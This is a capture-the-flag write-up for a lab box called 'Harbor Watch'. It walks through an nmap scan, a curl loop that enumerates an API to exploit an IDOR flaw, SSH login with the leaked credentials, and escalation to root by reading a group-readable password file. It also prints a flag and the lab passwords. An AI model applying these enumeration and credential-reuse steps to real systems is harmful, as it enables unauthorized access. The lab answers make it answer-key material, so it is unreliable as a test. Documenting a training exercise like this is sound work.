<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=Harbor+Watch" alt="Typing SVG" /></a>

</div>

# Harbor Watch — PWN · JID-Pwn101 · Level 1 · 🟢 EASY

- **Status:** ✅ SOLVED (4/4) — full boot2root chain to `root.txt`.
- **Points:** 725 / 725 (ports 100 · user 150 · user flag 200 · root 275)
- **Flags:** Open TCP ports → Low privilege user → User flag → Root flag (`CTF{...}` for the file flags)
- **Target:** `10.10.10.11` (lab, over WireGuard VPN)
- **Prompt:** *"Harbor watch" — boot2root chain.*

| # | Flag | Answer | Status |
|---|------|--------|--------|
| 1 | Open TCP ports | `22,80` | ✅ |
| 2 | Low privilege user | `pilot` | ✅ |
| 3 | User flag | `CTF{afc093a2a015c37940b0bf2c35aefda2}` | ✅ |
| 4 | Root flag | contents of `/root/root.txt` (`CTF{...}`) | ✅ |

---

## TL;DR

1. `nmap -p-` → `22,80`; the `:80` Python app lists vessels via `/api/vessel?id=N`.
2. IDOR past the menu exposes hidden `id=7` (`civil-pilot` / `keelhorn-7`) → SSH user = role `pilot`, password `keelhorn-7`.
3. `user.txt` sits at `/home/user.txt`; privesc reads the group-readable `/etc/harbor/maintenance.pass` (`drydock-root`) → `su -` → `root.txt`.

Commands below were run manually by the player; Claude never touched the target.

---

## Recon — Flag 1: Open TCP ports

Full TCP scan:

```bash
nmap -p- --min-rate 2000 -T4 10.10.10.11 -oN harbor-all.txt
```

```
22/tcp    open     ssh
80/tcp    open     http
47780/tcp filtered unknown
```

Service/version on the open ports:

```bash
nmap -sC -sV -p 22,80 10.10.10.11 -oN harbor-det.txt
```

```
22/tcp open ssh  OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
80/tcp open http BaseHTTPServer 0.6 (Python 3.11.2)  -- title "Harbor watch"
```

**Flag 1** = the **open** ports only, ascending, comma-separated, plaintext. `47780` is `filtered`, not `open`, so it is excluded:

```
22,80
```

> SSH 9.2p1 is patched — not the vector. The custom Python `BaseHTTPServer` app on :80 is the attack surface.

---

## Foothold — Flag 2: Low privilege user

The web root lists "vessels" via a parameterized API:

```html
<li><a href="/api/vessel?id=1">AS-north</a></li>
... id=2..5 ...
```

Each entry returns JSON:

```bash
for i in 0 1 2 3 4 5 6 7; do echo "=== id=$i ==="; curl -sS "http://10.10.10.11/api/vessel?id=$i"; echo; done
```

```
id=1  {"name": "AS-north",    "radio_key": "ignore-me"}
id=2  {"name": "ML-pier",     "radio_key": "decoy-2"}
id=3  {"name": "tug-4",       "radio_key": "decoy-3"}
id=4  {"name": "ferry",       "radio_key": "decoy-4"}
id=5  {"name": "buoy",        "radio_key": "decoy-5"}
id=7  {"name": "civil-pilot", "radio_key": "keelhorn-7"}   <-- IDOR: not in the menu
```

**IDOR**: ids 1–5 are shown in the page and are all self-labeled decoys (`decoy-N` / `ignore-me`). Iterating the `id` parameter past the menu exposes the hidden record **`id=7`**, the only non-decoy: `civil-pilot` / `keelhorn-7`.

### Interpreting the hint (the part that cost time)

The leaked record maps to the SSH credential, but not literally:

- **Password** = the literal `radio_key` value → `keelhorn-7`. (The `-7` is *not* a strippable id tag; the full string is the password.)
- **Username** = **not** the full vessel name. `civil-pilot` reads as `<adjective>-<role>`; the account is the role: **`pilot`**. (`civil-pilot` and `civil` both fail; `pilot` works.)

```bash
ssh pilot@10.10.10.11      # password: keelhorn-7
```

```
pilot@5cc3a413001d:~$ id
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot),1001(harbor)
```

**Flag 2** (the low-priv username, plaintext) = `pilot`

> Note: hostname `5cc3a413001d` + the secondary group `harbor` are the hooks for the next stages. The host is a Docker container.

---

## User flag — Flag 3

Not in `~`; it sits one level up, owned by `pilot`:

```bash
find / -iname 'user.txt' 2>/dev/null
# /home/user.txt   (-r-------- 1 pilot pilot)
cat /home/user.txt
```

**Flag 3** = `CTF{afc093a2a015c37940b0bf2c35aefda2}`

---

## Privesc — Flag 4: Root flag

Enumerating files owned by the secondary group `harbor` (which `pilot` is in):

```bash
find / -group harbor 2>/dev/null | grep -v '^/proc'
# /etc/harbor/maintenance.pass
```

```bash
ls -la /etc/harbor/           # -rw-r----- 1 root harbor 13  maintenance.pass
cat /etc/harbor/maintenance.pass
# drydock-root
```

The file is `root:harbor` and mode `640` — readable because `pilot ∈ harbor`. The value `drydock-root` is the **root password** (`sudo -l` as pilot fails; the password is for `su`):

```bash
su -        # password: drydock-root
cat /root/root.txt
```

**Flag 4** = exact contents of `/root/root.txt` (format `CTF{...}`).

---

## Summary / Chain

| # | Flag | Vector |
|---|------|--------|
| 1 | Open TCP ports | `nmap -p-` → `22,80` (47780 filtered, excluded) |
| 2 | Low privilege user | IDOR `/api/vessel?id=7` leaks `civil-pilot`/`keelhorn-7`; SSH user = role `pilot` |
| 3 | User flag | `/home/user.txt` (pilot-owned) → `CTF{afc093a2a015c37940b0bf2c35aefda2}` |
| 4 | Root flag | `harbor` group reads `/etc/harbor/maintenance.pass` = `drydock-root` → `su -` → `/root/root.txt` |

### Takeaways
- Filtered ≠ open: exclude `47780` from flag 1.
- The decoy labels (`decoy-N`, `ignore-me`) point straight at the one unlabeled record via IDOR.
- Credential derivation: password was the literal `radio_key`; the username was the **role** (`pilot`), not the full vessel name.
- Root was a plain group-based file read (secondary group `harbor` → readable root password), not an exploit.
